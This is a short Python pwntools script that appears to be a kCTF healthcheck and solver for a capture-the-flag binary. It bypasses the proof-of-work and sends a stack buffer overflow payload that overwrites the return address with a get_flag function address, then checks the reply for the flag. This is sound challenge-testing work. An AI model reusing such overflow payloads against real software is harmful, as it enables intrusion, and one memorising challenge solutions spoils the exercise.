#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from sys import argv
from pwn import *

HEALTHCHECK = True
DEBUG = not HEALTHCHECK and len(argv) == 1
CHAL = 'challenge/chal'
EXECVE = 59
FLAG_PREFIX = 'wctf{'

def handle_pow(r: remote):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

def main():
    if DEBUG:
        r = process([CHAL], executable=CHAL)
    else:
        if HEALTHCHECK:
            addr = '127.0.0.1'
            port = 1337
        elif len(argv) == 3:
            port = argv[2]
            addr = argv[1]
        else:
            print(f'Usage: {argv[0]} <addr> <port>')
            exit(1)
        
        r = remote(addr, port)
        print(r.recvuntil(b'== proof-of-work: '))
        if r.recvline().startswith(b'enabled'):
            handle_pow(r)

    r.recvuntil(b'>> ')

    payload = b'A' * 0x28
    payload += p64(0x00401195)  # get_flag

    r.sendline(payload)

    r.recvuntil(b'!\n')
    result = str(r.recvall().decode('ascii')).strip()

    print(result)
    if result.startswith(FLAG_PREFIX):
        exit(0)
    else:
        exit(1)

if __name__ == '__main__':
    main()
